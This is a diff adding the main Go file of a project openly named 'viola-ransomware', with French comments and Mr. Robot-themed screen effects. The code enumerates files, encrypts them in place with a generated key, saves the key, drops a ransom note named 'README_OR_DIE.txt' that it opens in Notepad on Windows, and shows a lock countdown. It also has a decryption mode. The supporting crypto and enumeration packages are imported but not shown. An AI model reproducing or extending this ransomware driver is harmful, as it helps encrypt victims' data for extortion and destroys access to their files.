@@ -1,0 +1,137 @@
+package main
+
+import (
+	"fmt"
+	"math/rand"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"runtime"
+	"time"
+	"viola-ransomware/config"
+	"viola-ransomware/crypto"
+	"viola-ransomware/enumeration"
+	"viola-ransomware/readwrite"
+)
+
+// Effet de texte Mr. Robot
+func TypeText(text string, speed time.Duration) {
+	for _, char := range text {
+		fmt.Printf("%c", char)
+		time.Sleep(speed)
+	}
+}
+
+// Ouvre la vidéo située dans le sous-dossier /videos/
+func PlayLocalVideo(fileName string) {
+	pwd, _ := os.Getwd()
+	// On cible le sous-dossier 'videos' comme indiqué dans votre chemin
+	videoPath := filepath.Join(pwd, "videos", fileName)
+
+	if _, err := os.Stat(videoPath); os.IsNotExist(err) {
+		fmt.Printf("\n[!] ERREUR CRITIQUE : Vidéo introuvable dans %s\n", videoPath)
+		return
+	}
+
+	var cmd *exec.Cmd
+	switch runtime.GOOS {
+	case "windows":
+		cmd = exec.Command("cmd", "/c", "start", "", videoPath)
+	case "darwin":
+		cmd = exec.Command("open", videoPath)
+	default: // Linux (Stalker)
+		cmd = exec.Command("xdg-open", videoPath)
+	}
+	cmd.Start()
+}
+
+func FinalCountdown(seconds int) {
+	fmt.Println("\n")
+	for i := seconds; i > 0; i-- {
+		fmt.Printf("\r[!] SYSTÈME VERROUILLÉ DANS %d SECONDES...", i)
+		time.Sleep(1 * time.Second)
+	}
+	fmt.Println("\n[!] ADIEU.")
+}
+
+func main() {
+	rand.Seed(time.Now().UnixNano())
+	var choice int
+	var confirm string
+	var key string
+
+	Clear_Terminal()
+	
+	// Intro Glitch
+	fmt.Println("################################################")
+	fmt.Println("#          WELCOME TO THE DARK SIDE            #")
+	fmt.Println("################################################")
+	
+	TypeText("\n> Initialisation du protocole STALKER...\n", 50*time.Millisecond)
+	fmt.Printf("\n[1] Lancer l'attaque (Audit)\n[2] Restaurer les données\nSaisie : ")
+	fmt.Scan(&choice)
+
+	if choice == 1 {
+		fmt.Print("\n⚠️  Êtes-vous sûr de vouloir corrompre ce système ? [y/n]: ")
+		fmt.Scan(&confirm)
+		if confirm != "y" { return }
+
+		// Lancement de la vidéo depuis le dossier /videos/
+		// Changez "fsociety.mp4" par le vrai nom de votre fichier
+		PlayLocalVideo("votre_video.mp4") 
+
+		key, _ = crypto.KeyGenerator(config.KeyByte)
+	} else {
+		fmt.Print("Entrez votre clé de déchiffrement : ")
+		fmt.Scan(&key)
+	}
+
+	files, _ := enumeration.DirectoryEnumeration(choice == 2)
+	if len(files) == 0 {
+		fmt.Println("\nAucune cible détectée.")
+		return
+	}
+
+	// Début de l'opération
+	fmt.Println()
+	StartTheGame(key, files, choice == 2)
+
+	if choice == 1 {
+		readwrite.SaveKey(key)
+		readwrite.WriteFilesNoExt(config.RansomwareMessage, "README_OR_DIE.txt")
+		
+		if runtime.GOOS == "windows" {
+			exec.Command("notepad.exe", "README_OR_DIE.txt").Start()
+		}
+
+		FinalCountdown(5) // Petit effet de pression final
+		TypeText("\nVos fichiers ont été chiffrés avec succès.\n", 100*time.Millisecond)
+	}
+}
+
+// Les fonctions StartTheGame et Clear_Terminal restent identiques aux précédentes...
+func StartTheGame(key string, AllDirectory []string, decrypt bool) {
+	for i, path := range AllDirectory {
+		data, err := readwrite.ReadFile(path)
+		if err != nil { continue }
+		var processedData []byte
+		if decrypt {
+			res, err := crypto.Decrypt(key, data)
+			if err != nil { continue }
+			processedData = []byte(res)
+		} else {
+			processedData, _ = crypto.Encrypt(key, data)
+		}
+		if readwrite.WriteFiles(processedData, path, decrypt) {
+			perc := (i + 1) * 100 / len(AllDirectory)
+			fmt.Printf("\r[%d%%] EXÉCUTION : %-40s", perc, filepath.Base(path))
+		}
+	}
+}
+
+func Clear_Terminal() {
+	cmd := exec.Command("clear")
+	if runtime.GOOS == "windows" { cmd = exec.Command("cmd", "/c", "cls") }
+	cmd.Stdout = os.Stdout
+	cmd.Run()
+}
